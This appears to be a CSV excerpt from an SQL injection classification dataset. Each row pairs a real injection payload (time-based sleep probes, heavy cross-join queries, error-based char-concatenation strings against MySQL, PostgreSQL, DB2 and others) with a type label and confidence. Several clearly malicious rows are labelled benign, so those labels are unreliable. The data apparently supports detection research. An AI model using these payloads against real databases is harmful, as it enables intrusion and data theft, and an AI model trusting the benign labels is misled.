id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
25344,"1 where 8908 = 8908 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25345,"1"" ) as kfvy where 7305 = 7305 or sleep ( 5 ) --",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25346,1 where 7021 = 7021 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
25347,"1', ( select ( case when ( 1570 = 1570 ) then ( select 1570 from pg_sleep ( 5 ) ) else 1/ ( select 0 ) end ) )",time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
25348,"1"" ) where 8095 = 8095 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25349,"-5963"" or 9323 = 9323#",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25350,1' where 8584 = 8584 order by 1#,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25351,1 ) ),unknown,generic,0.50,Insufficient information to classify,1
25352,"1%' ) ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( '%' = '",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25353,"1' ) ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'vtno' = 'vtno",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
